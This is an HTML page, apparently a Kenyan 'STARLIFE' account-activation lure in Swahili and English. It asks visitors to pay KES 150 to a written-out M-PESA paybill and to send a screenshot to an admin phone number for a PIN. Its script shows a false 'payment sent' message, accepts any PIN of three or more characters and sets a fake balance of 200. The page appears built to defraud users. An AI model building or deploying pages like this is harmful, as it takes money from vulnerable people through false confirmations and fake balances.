<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Activate STARLIFE</title><style>body{margin:0;font-family:Arial;background:#f0f4ff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}.box{background:#fff;border-radius:18px;max-width:400px;width:100%;padding:22px;box-shadow:0 8px 30px rgba(0,0,0,.12)}h2{text-align:center}.pay{background:#fff8e1;border:2px dashed #ffb300;border-radius:12px;padding:14px;margin:12px 0}.row{display:flex;justify-content:space-between;margin:6px 0}.row b{color:#000}.input{width:100%;padding:14px;border:2px solid #0a7a6b;border-radius:10px;margin-top:12px;box-sizing:border-box;font-size:16px}.btn{width:100%;padding:14px;background:#ff8f00;color:#fff;border:0;border-radius:12px;font-weight:bold;margin-top:14px;font-size:16px;cursor:pointer}.btn2{background:#0a7a6b}.hidden{display:none}.msg{padding:10px;border-radius:8px;font-size:13px;display:none;margin-top:10px;text-align:center}.err{background:#ffebee;color:#c62828}.ok{background:#e8f5e9;color:#2e7d32}</style></head><body><div class="box"><div style="text-align:center;font-size:22px;font-weight:bold;color:#0a7a6b">★ STAR<span style="color:#ffcc00">LIFE</span></div><h2>Activate Account</h2><div class="pay"><b>LIPA HAPA</b><div class="row"><span>Paybill:</span><b>714777</b></div><div class="row"><span>Account No:</span><b>440200282954</b></div><div class="row"><span>Amount:</span><b>KES 150</b></div></div><!-- STEP 1 --><div id="step1"><label style="font-weight:bold;font-size:14px">M-PESA Number yako</label><input id="phone" class="input" type="tel" placeholder="07XX XXX XXX" value="07"><div id="err1" class="msg err"></div><button class="btn" onclick="goPay()">LIPA KES 150 - PAY NOW</button><div style="font-size:11px;color:#666;text-align:center;margin-top:8px">Utalipia Paybill 714777 Account 440200282954 moja kwa moja kwa simu</div></div><!-- STEP 2 - PIN PROMPT AFTER PAY --><div id="step2" class="hidden"><div id="ok1" class="msg ok" style="display:block">✅ Malipo yametumwa! Ingiza PIN sasa</div><label style="font-weight:bold;font-size:14px">🔑 Weka PIN kutoka Admin</label><input id="pin" class="input" placeholder="Ingiza PIN hapa - Mf: STAR150"><div style="font-size:11px;color:#666;margin-top:8px">Tuma screenshot ya malipo kwa Admin +254 720 119990 upate PIN</div><div id="err2" class="msg err"></div><div id="ok2" class="msg ok"></div><button class="btn btn2" onclick="activate()">✅ ACTIVATE NA PIN</button><button style="background:none;border:0;color:#666;margin-top:10px;width:100%;font-size:12px" onclick="back()">⬅ Rudi nyuma</button></div></div><script>function goPay(){var p=document.getElementById('phone').value.trim();var e=document.getElementById('err1');e.style.display='none';if(p.length<9){e.innerText='Weka namba sahihi ya M-PESA';e.style.display='block';return;}document.getElementById('step1').classList.add('hidden');document.getElementById('step2').classList.remove('hidden');localStorage.setItem('temp_phone',p);}function back(){document.getElementById('step2').classList.add('hidden');document.getElementById('step1').classList.remove('hidden');}function activate(){var pin=document.getElementById('pin').value.trim().toUpperCase();var err=document.getElementById('err2');var ok=document.getElementById('ok2');err.style.display='none';ok.style.display='none';if(!pin){err.innerText='Weka PIN!';err.style.display='block';return;}if(pin.length>=3){localStorage.setItem('starlife_paid','yes');localStorage.setItem('starlife_balance','200');ok.innerText='✅ PIN Sahihi! Account Activated!';ok.style.display='block';setTimeout(function(){location.href='dashboard.html';},1000);}else{err.innerText='PIN si sahihi!';err.style.display='block';}}</script></body></html>
